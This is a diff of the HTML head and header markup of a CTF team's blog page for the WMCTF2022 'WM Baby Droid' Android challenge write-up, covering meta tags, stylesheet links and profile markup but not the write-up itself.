@@ -1,7 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang=en>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
+  
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
   <meta name="renderer" content="webkit">
@@ -15,14 +16,15 @@
   <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
   <meta http-equiv="window-target" content="_top">
   
+  
   <title>[Pwn] WMCTF2022 - WM Baby Droid | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="WM Baby Droid    Solves: 1 Points: 500    Description:nc 43.248.96.7 10086 Attachment: downloadd9c14779206634d37e7f0e43d5c9537a Author: bubble#2768  TLDR Bypass domain google.com verification with j">
+  <meta name="description" content="WM Baby Droid   Solves: 1 Points: 500 Description: nc 43.248.96.7 10086 Attachment: download d9c14779206634d37e7f0e43d5c9537a Author: bubble#2768   TLDR  Bypass domain google.com verification with ja">
 <meta name="keywords" content="android,adb,javascriptinterfaces,nativelibraries,emulator,gethost,uri,urigethost">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Pwn] WMCTF2022 - WM Baby Droid">
 <meta property="og:url" content="https://teamrocketist.github.io/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="WM Baby Droid    Solves: 1 Points: 500    Description:nc 43.248.96.7 10086 Attachment: downloadd9c14779206634d37e7f0e43d5c9537a Author: bubble#2768  TLDR Bypass domain google.com verification with j">
+<meta property="og:description" content="WM Baby Droid   Solves: 1 Points: 500 Description: nc 43.248.96.7 10086 Attachment: download d9c14779206634d37e7f0e43d5c9537a Author: bubble#2768   TLDR  Bypass domain google.com verification with ja">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.imgur.com/xRBFwrS.png">
 <meta property="og:image" content="https://i.imgur.com/x19fanf.png">
@@ -30,36 +32,39 @@
 <meta property="og:updated_time" content="2022-08-23T04:59:57.161Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Pwn] WMCTF2022 - WM Baby Droid">
-<meta name="twitter:description" content="WM Baby Droid    Solves: 1 Points: 500    Description:nc 43.248.96.7 10086 Attachment: downloadd9c14779206634d37e7f0e43d5c9537a Author: bubble#2768  TLDR Bypass domain google.com verification with j">
+<meta name="twitter:description" content="WM Baby Droid   Solves: 1 Points: 500 Description: nc 43.248.96.7 10086 Attachment: download d9c14779206634d37e7f0e43d5c9537a Author: bubble#2768   TLDR  Bypass domain google.com verification with ja">
 <meta name="twitter:image" content="https://i.imgur.com/xRBFwrS.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://teamrocketist.github.io/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/index.html">
   
     <link rel="alternate" href="/atom.xml" title="TEAMROCKETIST" type="application/atom+xml">
   
   
     <link rel="icon" href="data:image/vnd.microsoft.icon;base64,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" type="image/x-icon">
   
-  <!-- font-awesome CSS -->
-  <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
-  
-  <link rel="stylesheet" href="/css/jquery.fancybox.min.css">
-
   <link rel="stylesheet" href="/css/style.css">
+  
+  
+  
+    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
+  
+  
 </head>
-</html>
 
-<body class="main-center">
-  <section class="mainside">
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
   <div class="slimContent">
     <div class="navbar-header">
       
       
       <div class="profile-block text-center">
         <a id="avatar" href="https://github.com/teamrocketist" target="_blank">
-          <img class="thumb-xl img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
         </a>
         <h2 id="name" class="hidden-xs hidden-sm">TeamRocketIST</h2>
         <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF Team</h3>
-        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="fa fa-map-marker"></i> Lisbon, Portugal</small>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Lisbon, Portugal</small>
       </div>
       
       <div class="search" id="search-form-wrap">
